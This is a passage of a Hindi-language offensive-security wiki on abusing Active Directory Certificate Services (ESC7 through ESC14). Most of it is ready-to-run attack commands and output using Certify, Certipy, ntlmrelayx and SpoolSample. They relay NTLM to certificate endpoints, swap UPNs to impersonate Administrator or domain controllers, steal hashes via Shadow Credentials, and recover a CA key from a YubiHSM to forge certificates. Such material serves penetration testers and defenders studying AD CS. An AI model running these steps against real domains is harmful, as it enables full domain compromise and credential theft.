[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explanation

क्लासिक ESC7 abuses (EDITF attributes enable करना या pending requests approve करना) के अलावा, **Certify 2.0** ने एक बिल्कुल नया primitive उजागर किया, जिसके लिए Enterprise CA पर केवल *Manage Certificates* (जिसे **Certificate Manager / Officer** भी कहा जाता है) role की आवश्यकता होती है।<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC method को *Manage Certificates* रखने वाला कोई भी principal execute कर सकता है। परंपरागत रूप से, इस method का उपयोग वैध CAs द्वारा **pending** requests पर extensions अपडेट करने के लिए किया जाता था। लेकिन attacker इसका दुरुपयोग करके approval की प्रतीक्षा कर रही request में **एक *non-default* certificate extension जोड़ सकता है** (उदाहरण के लिए, `1.1.1.1` जैसा custom *Certificate Issuance Policy* OID)।

क्योंकि लक्षित template उस extension के लिए **कोई default value निर्धारित नहीं करता**, इसलिए request अंततः issue होने पर CA attacker-नियंत्रित value को overwrite नहीं करेगा। इस तरह बने certificate में attacker द्वारा चुना गया extension होगा, जो ये काम कर सकता है:

* अन्य vulnerable templates की Application / Issuance Policy आवश्यकताएँ पूरी करना (जिससे privilege escalation हो सकती है)।
* अतिरिक्त EKUs या policies inject करना, जो third-party systems में certificate को अप्रत्याशित trust प्रदान करती हैं।

संक्षेप में, *Manage Certificates* — जिसे पहले ESC7 का “कम शक्तिशाली” हिस्सा माना जाता था — अब full privilege escalation या long-term persistence के लिए इस्तेमाल किया जा सकता है। इसके लिए न तो CA configuration में बदलाव करना पड़ता है, न ही अधिक प्रतिबंधित *Manage CA* right की आवश्यकता होती है।

#### Abusing the primitive with Certify 2.0

1. **ऐसी certificate request submit करें जो *pending* रहे।** इसे ऐसे template से बाध्य किया जा सकता है जिसमें manager approval आवश्यक हो:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **लंबित अनुरोध में एक कस्टम एक्सटेंशन जोड़ें** नए `manage-ca` कमांड का उपयोग करके:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *यदि template में पहले से *Certificate Issuance Policies* extension परिभाषित नहीं है, तो जारी करने के बाद ऊपर दिया गया मान बरकरार रहेगा।*

3. **अनुरोध जारी करें** (यदि आपकी role के पास *Manage Certificates* approval rights भी हैं) या किसी operator द्वारा इसे approve किए जाने की प्रतीक्षा करें। जारी होने के बाद, certificate डाउनलोड करें:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. परिणामी certificate में अब malicious issuance-policy OID शामिल है और इसका उपयोग बाद के attacks (जैसे ESC13, domain escalation आदि) में किया जा सकता है।

> NOTE: Certipy ≥ 4.7 के माध्यम से `ca` command और `-set-extension` parameter का उपयोग करके भी यही attack किया जा सकता है।

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### व्याख्या

> [!TIP]
> जिन environments में **AD CS installed है**, यदि कोई **vulnerable web enrollment endpoint मौजूद है** और कम-से-कम एक **certificate template प्रकाशित है** जो **domain computer enrollment और client authentication** की अनुमति देता है (जैसे default **`Machine`** template), तो **spooler service active वाले किसी भी computer को attacker द्वारा compromise किया जा सकता है**!

AD CS कई **HTTP-based enrollment methods** को support करता है, जो administrators द्वारा install की जा सकने वाली अतिरिक्त server roles के माध्यम से उपलब्ध होते हैं। HTTP-based certificate enrollment के ये interfaces **NTLM relay attacks** के प्रति vulnerable हैं। **Compromised machine से**, attacker **inbound NTLM के ज़रिए authenticate होने वाले किसी भी AD account का impersonate कर सकता है**। Victim account का impersonate करते हुए, attacker इन web interfaces का उपयोग करके **`User` या `Machine` certificate templates के ज़रिए client authentication certificate के लिए request कर सकता है**।

- **Web enrollment interface** (एक पुराना ASP application, जो `http://<caserver>/certsrv/` पर उपलब्ध है) default रूप से केवल HTTP का उपयोग करता है, जो NTLM relay attacks से सुरक्षा नहीं देता। इसके अतिरिक्त, यह अपने Authorization HTTP header के माध्यम से स्पष्ट रूप से केवल NTLM authentication की अनुमति देता है, जिससे Kerberos जैसे अधिक सुरक्षित authentication methods का उपयोग नहीं किया जा सकता।
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, और **Network Device Enrollment Service** (NDES) default रूप से अपने Authorization HTTP header के ज़रिए negotiate authentication support करते हैं। Negotiate authentication, Kerberos और **NTLM दोनों को support करता है**, जिससे attacker relay attacks के दौरान authentication को **downgrade करके NTLM** पर ला सकता है। हालांकि ये web services default रूप से HTTPS enable करती हैं, लेकिन केवल HTTPS **NTLM relay attacks से सुरक्षा नहीं देता**। HTTPS services पर NTLM relay attacks से सुरक्षा तभी संभव है जब HTTPS के साथ channel binding का उपयोग किया जाए। दुर्भाग्य से, AD CS IIS पर Extended Protection for Authentication activate नहीं करता, जो channel binding के लिए आवश्यक है।<sup>[[6]](#references)</sup>

NTLM relay attacks के साथ एक आम **समस्या** NTLM sessions की **कम अवधि** और ऐसी services के साथ interact करने में attacker की असमर्थता है जिन्हें **NTLM signing की आवश्यकता होती है**।

फिर भी, user के लिए certificate प्राप्त करने हेतु NTLM relay attack का फायदा उठाकर इस सीमा को पार किया जा सकता है, क्योंकि session की अवधि certificate की validity period से तय होती है और certificate का उपयोग उन services के साथ किया जा सकता है जिन्हें **NTLM signing अनिवार्य है**। चोरी किए गए certificate का उपयोग करने के निर्देशों के लिए देखें:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attacks की एक और सीमा यह है कि **victim account को attacker-controlled machine के साथ authenticate करना पड़ता है**। Attacker या तो इंतज़ार कर सकता है या इस authentication को **force** करने की कोशिश कर सकता है:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **दुरुपयोग**

[**Certify**](https://github.com/GhostPack/Certify) का `cas` **enabled HTTP AD CS endpoints** की enumeration करता है:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` प्रॉपर्टी का उपयोग enterprise Certificate Authorities (CAs), Certificate Enrollment Service (CES) endpoints को संग्रहीत करने के लिए करती हैं। इन endpoints को **Certutil.exe** टूल का उपयोग करके पार्स और सूचीबद्ध किया जा सकता है:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify के साथ दुरुपयोग

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### [Certipy](https://github.com/ly4k/Certipy) के साथ दुरुपयोग

डिफ़ॉल्ट रूप से, Certipy `Machine` या `User` template के आधार पर certificate का अनुरोध करता है। यह इस बात से निर्धारित होता है कि relay किए जा रहे account name का अंत `$` से होता है या नहीं। वैकल्पिक template निर्दिष्ट करने के लिए `-template` parameter का उपयोग किया जा सकता है।

इसके बाद authentication को coerce करने के लिए [PetitPotam](https://github.com/ly4k/PetitPotam) जैसी technique का इस्तेमाल किया जा सकता है। Domain controller के मामले में, `-template DomainController` निर्दिष्ट करना आवश्यक है।

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## कोई Security Extension नहीं - ESC9 <a href="#id-5485" id="id-5485"></a>

### व्याख्या

**`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) मान, जो **`msPKI-Enrollment-Flag`** के लिए है और ESC9 कहलाता है, किसी certificate से `szOID_NTDS_CA_SECURITY_EXT` SID extension को हटा देता है। ESC9 के पुराने उदाहरण KDC के compatibility behavior (`StrongCertificateBindingEnforcement=1`) या अलग weak Schannel mapping route पर निर्भर करते हैं। मान `1` एक **ऐतिहासिक compatibility setting** है, मौजूदा default नहीं: Microsoft के अनुसार, 9 सितंबर, 2025 के Windows security update के बाद KDC override का समर्थन बंद हो गया। पुराने तरीके को लागू करने से पहले target के वास्तविक update और authentication endpoint की जाँच करें।<sup>[[7]](#references)</sup> [Microsoft की rollout guidance](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) देखें।

इस flag की setting किन परिस्थितियों में महत्वपूर्ण हो जाती है:

- किसी पुराने, compatible KDC पर, प्रभावी certificate-binding policy mapping की अनुमति देती है; वैकल्पिक रूप से, Schannel endpoint अलग से `CertificateMappingMethods` bit `0x4` के ज़रिए UPN mapping सक्षम करता है।
- Certificate को `msPKI-Enrollment-Flag` setting के भीतर `CT_FLAG_NO_SECURITY_EXTENSION` flag के साथ चिह्नित किया गया है।
- Certificate में कोई client authentication EKU निर्दिष्ट है।
- किसी अन्य account को compromise करने के लिए उस account पर `GenericWrite` permissions उपलब्ध हैं।

### दुरुपयोग का परिदृश्य

मान लें कि `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` permissions हैं, और लक्ष्य `Administrator@corp.local` को compromise करना है। `ESC9` certificate template, जिसमें `Jane@corp.local` enroll कर सकती है, अपनी `msPKI-Enrollment-Flag` setting में `CT_FLAG_NO_SECURITY_EXTENSION` flag के साथ configure किया गया है।

शुरुआत में, `John` के `GenericWrite` के कारण Shadow Credentials का उपयोग करके `Jane` का hash प्राप्त किया जाता है:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

इसके बाद, `Jane` का `userPrincipalName` बदलकर `Administrator` कर दिया जाता है, जानबूझकर `@corp.local` डोमेन वाला हिस्सा छोड़कर:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

यह संशोधन constraints का उल्लंघन नहीं करता, क्योंकि `Administrator@corp.local`, `Administrator` के `userPrincipalName` से अलग रहता है।

इसके बाद, `ESC9` certificate template, जिसे vulnerable के रूप में चिह्नित किया गया है, का अनुरोध `Jane` के रूप में किया जाता है:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

यह नोट किया गया है कि certificate का `userPrincipalName` “object SID” के बिना `Administrator` दर्शाता है।

इसके बाद `Jane` का `userPrincipalName` उसके मूल मान `Jane@corp.local` पर वापस कर दिया जाता है:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

जारी किए गए certificate के साथ authentication करने पर अब `Administrator@corp.local` का NT hash मिलता है। Certificate में domain निर्दिष्ट न होने के कारण command में `-domain <domain>` शामिल होना चाहिए:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## कमजोर Certificate Mappings - ESC10

### व्याख्या

ESC10 के अंतर्गत अक्सर दो अलग-अलग certificate-mapping policies पर चर्चा की जाती है। संबंधित authentication को वास्तव में संभालने वाले endpoint की setting देखें:

- Application server पर TLS client-certificate mapping को `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` के अंतर्गत Schannel `CertificateMappingMethods` नियंत्रित करता है। UPN bit `0x4` है; updated systems पर default `0x18` (`0x8 | 0x10`) है।
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` के अंतर्गत KDC `StrongCertificateBindingEnforcement` ऐतिहासिक रूप से Kerberos certificate-binding compatibility को नियंत्रित करता था। Value `1` वर्तमान default का विश्वसनीय संकेत नहीं है, और Microsoft ने September 9, 2025 Windows security update के साथ इस override का support समाप्त कर दिया। इसकी स्थिति अपने आप में Schannel की UPN mapping का वर्णन नहीं करती।<sup>[[7]](#references)</sup>

**मामला 1**

ऐतिहासिक रूप से, जब कोई पुराना KDC `StrongCertificateBindingEnforcement=0` को मानता था; update level की पुष्टि करें, क्योंकि current patched systems पर यह override अब समर्थित नहीं है।

**मामला 2**

जब Schannel client-certificate endpoint पर `CertificateMappingMethods` का UPN bit (`0x4`) enabled हो। यह KDC strong-binding enforcement से अलग setting है और इसके लिए अब भी enrollable client-authentication certificate तथा mapped account attribute पर प्रभावी नियंत्रण आवश्यक है।

### Abuse Case 1

पुराने deployment में, जहाँ KDC अब भी `StrongCertificateBindingEnforcement=0` को मानता है, किसी account के `userPrincipalName` पर नियंत्रण दूसरे account तक पहुँचने वाले weak-mapping path का हिस्सा हो सकता है। आवश्यक certificate enrollment, mapping, target identity और सफल authentication की अलग-अलग जाँच करनी होगी; केवल `GenericWrite` ACE या registry value takeover साबित नहीं करता।

उदाहरण के लिए, `Jane@corp.local` पर `GenericWrite` permissions होने पर, attacker का लक्ष्य `Administrator@corp.local` को compromise करना है। यह प्रक्रिया ESC9 जैसी है, जिसमें किसी भी certificate template का उपयोग किया जा सकता है।

शुरुआत में, `GenericWrite` का फायदा उठाकर Shadow Credentials के माध्यम से `Jane` का hash प्राप्त किया जाता है।

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

इसके बाद, `Jane` का `userPrincipalName` बदलकर `Administrator` कर दिया जाता है। Constraint violation से बचने के लिए जानबूझकर `@corp.local` वाला हिस्सा छोड़ दिया जाता है।

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

इसके बाद, client authentication सक्षम करने वाला certificate, default `User` template का उपयोग करके `Jane` के रूप में अनुरोध किया जाता है।

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane` का `userPrincipalName` इसके बाद उसके मूल मान `Jane@corp.local` पर वापस कर दिया जाता है।

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

प्राप्त certificate से authenticate करने पर `Administrator@corp.local` का NT hash मिलेगा। चूँकि certificate में domain की जानकारी नहीं है, इसलिए command में domain निर्दिष्ट करना आवश्यक है।

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Abuse Case 2

`CertificateMappingMethods` में `UPN` bit flag (`0x4`) होने पर, `GenericWrite` permissions वाला account A किसी भी ऐसे account B को compromise कर सकता है जिसमें `userPrincipalName` property मौजूद न हो। इसमें machine accounts और built-in domain administrator `Administrator` शामिल हैं।

यहाँ लक्ष्य `DC$@corp.local` को compromise करना है। इसकी शुरुआत `GenericWrite` का लाभ उठाकर Shadow Credentials के माध्यम से `Jane` का hash प्राप्त करने से होती है।

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`Jane` का `userPrincipalName` फिर `DC$@corp.local` पर सेट किया जाता है।

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

डिफ़ॉल्ट `User` template का उपयोग करके, `Jane` के रूप में client authentication के लिए एक certificate का अनुरोध किया जाता है।

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

इस प्रक्रिया के बाद `Jane` का `userPrincipalName` अपने मूल मान पर वापस आ जाता है।

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Schannel के माध्यम से प्रमाणित करने के लिए Certipy का `-ldap-shell` विकल्प इस्तेमाल किया जाता है, जो `u:CORP\DC$` के रूप में सफल authentication दर्शाता है।

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

LDAP shell के ज़रिए, `set_rbcd` जैसे commands Resource-Based Constrained Delegation (RBCD) attacks सक्षम करते हैं, जिससे domain controller संभवतः compromise हो सकता है।

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

यह vulnerability उन सभी user accounts तक भी विस्तारित होती है जिनमें `userPrincipalName` नहीं है या जहाँ यह `sAMAccountName` से मेल नहीं खाता। डिफ़ॉल्ट `Administrator@corp.local` एक प्रमुख target है, क्योंकि इसके LDAP privileges ऊँचे हैं और डिफ़ॉल्ट रूप से इसमें `userPrincipalName` नहीं होता।

## NTLM को ICPR पर relaying - ESC11

### व्याख्या

यदि CA Server को `IF_ENFORCEENCRYPTICERTREQUEST` के साथ configure नहीं किया गया है, तो RPC service के ज़रिए signing के बिना NTLM relay attacks किए जा सकते हैं। [यहाँ संदर्भ](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

आप यह पता लगाने के लिए `certipy` का उपयोग कर सकते हैं कि `Enforce Encryption for Requests` Disabled है या नहीं। certipy `ESC11` Vulnerabilities दिखाएगा।

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### दुरुपयोग परिदृश्य

इसके लिए एक relay server सेट अप करना आवश्यक है:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

ध्यान दें: डोमेन कंट्रोलर्स के लिए, हमें DomainController में `-template` निर्दिष्ट करना होगा।

या [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) का उपयोग करके:

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Shell access to ADCS CA with YubiHSM - ESC12

### व्याख्या

प्रशासक Certificate Authority को "Yubico YubiHSM2" जैसे किसी बाहरी डिवाइस पर स्टोर करने के लिए सेट अप कर सकते हैं।

अगर USB डिवाइस CA सर्वर से USB पोर्ट के ज़रिए कनेक्ट हो, या CA सर्वर वर्चुअल मशीन होने की स्थिति में USB डिवाइस सर्वर से कनेक्ट हो, तो YubiHSM में keys जनरेट करने और उनका उपयोग करने के लिए Key Storage Provider को एक authentication key (जिसे कभी-कभी "password" भी कहा जाता है) की ज़रूरत होती है।

यह key/password रजिस्ट्री में `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` पर cleartext में स्टोर होता है।

[यहाँ](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm) संदर्भ देखें।<sup>[[11]](#references)</sup>

### दुरुपयोग परिदृश्य

अगर CA की private key किसी physical USB डिवाइस पर स्टोर हो और आपको shell access मिल जाए, तो key को recover करना संभव है।

सबसे पहले, आपको CA certificate प्राप्त करना होगा (यह public होता है), फिर:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

अंत में, CA certificate और उसकी private key का उपयोग करके नया मनमाना certificate बनाने के लिए `certutil -sign` command का उपयोग करें।

## OID Group Link Abuse - ESC13

### Explanation

`msPKI-Certificate-Policy` attribute, certificate template में issuance policy जोड़ने की अनुमति देता है। Issuance policies के लिए ज़िम्मेदार `msPKI-Enterprise-Oid` objects को PKI OID container के Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) में खोजा जा सकता है। इस object के `msDS-OIDToGroupLink` attribute का उपयोग करके किसी policy को AD group से link किया जा सकता है, जिससे system उस user को, जो certificate प्रस्तुत करता है, ऐसे authorize कर सकता है मानो वह उस group का सदस्य हो। [यहाँ संदर्भ](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)।<sup>[[12]](#references)</sup>

दूसरे शब्दों में, जब किसी user को certificate enroll करने की अनुमति हो और certificate किसी OID group से link हो, तो user उस group के privileges प्राप्त कर सकता है।

OIDToGroupLink खोजने के लिए [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) का उपयोग करें:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### दुरुपयोग का परिदृश्य

ऐसी user permission खोजें जिसका उपयोग `certipy find` या `Certify.exe find /showAllPermissions` कर सके।

अगर `John` के पास `VulnerableTemplate` में enroll करने की permission है, तो user `VulnerableGroup` group के privileges inherit कर सकता है।

उसे बस template specify करना है; उसे `OIDToGroupLink` rights वाला certificate मिल जाएगा।

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Explicit Certificate Mapping Abuse — ESC14

### विवरण

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping पर दिया गया विवरण उल्लेखनीय रूप से व्यापक है। नीचे मूल पाठ का उद्धरण दिया गया है।<sup>[[14]](#references)</sup>

ESC14, "weak explicit certificate mapping" से उत्पन्न कमजोरियों को संबोधित करता है, जो मुख्य रूप से Active Directory के user या computer accounts पर `altSecurityIdentities` attribute के दुरुपयोग या असुरक्षित कॉन्फ़िगरेशन के कारण होती हैं। यह multi-valued attribute, administrators को authentication के लिए X.509 certificates को AD account से मैन्युअल रूप से जोड़ने की अनुमति देता है। भर दिए जाने पर, ये explicit mappings डिफ़ॉल्ट certificate mapping logic को override कर सकती हैं, जो आम तौर पर certificate के SAN में मौजूद UPNs या DNS names, या `szOID_NTDS_CA_SECURITY_EXT` security extension में embedded SID पर निर्भर करता है।

"weak" mapping तब होती है जब `altSecurityIdentities` attribute में certificate की पहचान के लिए इस्तेमाल की गई string value बहुत व्यापक हो, आसानी से अनुमानित हो, non-unique certificate fields पर निर्भर हो, या आसानी से spoof किए जा सकने वाले certificate components का उपयोग करती हो। यदि attacker कोई ऐसा certificate प्राप्त कर सकता है या बना सकता है जिसके attributes किसी privileged account के लिए इस तरह परिभाषित weak explicit mapping से मेल खाते हों, तो वह उस account के रूप में authenticate और impersonate करने के लिए उस certificate का उपयोग कर सकता है।

संभावित रूप से weak `altSecurityIdentities` mapping strings के उदाहरण:

- केवल एक सामान्य Subject Common Name (CN) के आधार पर mapping: जैसे, `X509:<S>CN=SomeUser`। Attacker किसी कम सुरक्षित स्रोत से इस CN वाला certificate प्राप्त कर सकता है।
- किसी विशिष्ट serial number या subject key identifier जैसी अतिरिक्त योग्यता के बिना अत्यधिक सामान्य Issuer Distinguished Names (DNs) या Subject DNs का उपयोग: जैसे, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`।
- अन्य अनुमानित patterns या non-cryptographic identifiers का उपयोग, जिन्हें attacker किसी ऐसे certificate में शामिल कर सकता है जिसे वह वैध रूप से प्राप्त कर सकता है या forge कर सकता है (यदि उसने CA को compromise किया हो या ESC1 की तरह कोई vulnerable template पाया हो)।

`altSecurityIdentities` attribute mapping के लिए कई formats का समर्थन करता है, जैसे:

- `X509:<I>IssuerDN<S>SubjectDN` (पूरे Issuer और Subject DN के आधार पर mapping)
- `X509:<SKI>SubjectKeyIdentifier` (certificate के Subject Key Identifier extension value के आधार पर mapping)
- `X509:<SR>SerialNumberBackedByIssuerDN` (serial number के आधार पर mapping, जिसमें Issuer DN परोक्ष रूप से शामिल होता है) - यह standard format नहीं है; आम तौर पर यह `<I>IssuerDN<SR>SerialNumber` होता है।
- `X509:<RFC822>EmailAddress` (SAN से RFC822 name, आम तौर पर email address, के आधार पर mapping)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (certificate की raw public key के SHA1 hash के आधार पर mapping - आम तौर पर मजबूत)

इन mappings की सुरक्षा, mapping में इस्तेमाल किए गए identifiers पर निर्भर करती है। Microsoft email या subject names पर आधारित mappings, जिनमें `X509:<RFC822>` भी शामिल है, को **weak** के रूप में वर्गीकृत करता है। Full Enforcement mode में, strong mapping के बिना certificate अस्वीकार कर दिया जाता है; सितंबर 2025 के Windows security update ने Compatibility mode पर लौटने का विकल्प हटा दिया। इसलिए केवल weak mapping अब impersonation का कोई भरोसेमंद रास्ता नहीं है। Weak-mapping scenario का आकलन करने से पहले domain controller का वास्तविक patch level और certificate-mapping behavior जाँचें। `altSecurityIdentities` पर write access एक अलग सुराग है: उपयुक्त trusted certificate वाला attacker, प्रभावी permissions और certificate validation के अधीन, **strong** explicit mapping जोड़ने में सक्षम हो सकता है। [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) और [ESC14 research](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/) देखें।

Certificate authentication failures की भी जाँच ज़रूरी है: target account disabled होने या password expire होने पर login रुक सकता है, भले ही certificate अभी भी valid हो।

### दुरुपयोग का परिदृश्य

ESC14, Active Directory (AD) में **explicit certificate mappings**, विशेष रूप से `altSecurityIdentities` attribute को निशाना बनाता है। यदि यह attribute सेट है (डिज़ाइन के अनुसार या misconfiguration के कारण), तो attackers matching certificates पेश करके accounts का impersonation कर सकते हैं।

#### परिदृश्य A: Attacker `altSecurityIdentities` में लिख सकता है

 **पूर्वशर्त**: Attacker के पास target account के `altSecurityIdentities` attribute पर write permissions हों, या target AD object पर निम्नलिखित permissions में से किसी एक के ज़रिए यह permission देने का अधिकार हो:  
- `altSecurityIdentities` property लिखने की अनुमति  
- `Public-Information` property लिखने की अनुमति  
- सभी properties लिखने की अनुमति  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*।
#### परिदृश्य B: Target में X509RFC822 (Email) के ज़रिए weak mapping है

- **ऐतिहासिक/सशर्त पूर्वशर्त**: Target के `altSecurityIdentities` में weak X509RFC822 mapping हो, attacker किसी enrollee का `mail` attribute संपादित कर सकता हो, और उपयुक्त template उस email को client-authentication certificate में शामिल करता हो, जिसमें कोई conflicting SID binding न हो। Authentication के लिए ऐसा environment भी आवश्यक है जो अब भी weak mapping स्वीकार करता हो; Full Enforcement केवल weak certificate mappings को अस्वीकार करता है। केवल writable `mail` attribute एक सुराग है।
#### परिदृश्य C: Target में X509IssuerSubject mapping है

- **पूर्वशर्त**: Target के `altSecurityIdentities` में weak X509IssuerSubject explicit mapping हो। Attacker किसी victim principal के `cn` या `dNSHostName` attribute को सेट करके target की X509IssuerSubject mapping के subject से मेल करा सकता हो। इसके बाद attacker victim के रूप में certificate enroll कर सकता है और उस certificate का उपयोग target के रूप में authenticate करने के लिए कर सकता है।
#### परिदृश्य D: Target में X509SubjectOnly mapping है

- **पूर्वशर्त**: Target के `altSecurityIdentities` में weak X509SubjectOnly explicit mapping हो। Attacker किसी victim principal के `cn` या `dNSHostName` attribute को सेट करके target की X509SubjectOnly mapping के subject से मेल करा सकता हो। इसके बाद attacker victim के रूप में certificate enroll कर सकता है और उस certificate का उपयोग target के रूप में authenticate करने के लिए कर सकता है।
### ठोस कार्रवाइयाँ
#### परिदृश्य A

Certificate template `Machine` का certificate माँगें

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 सर्टिफ़िकेट को सहेजें और कन्वर्ट करें

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

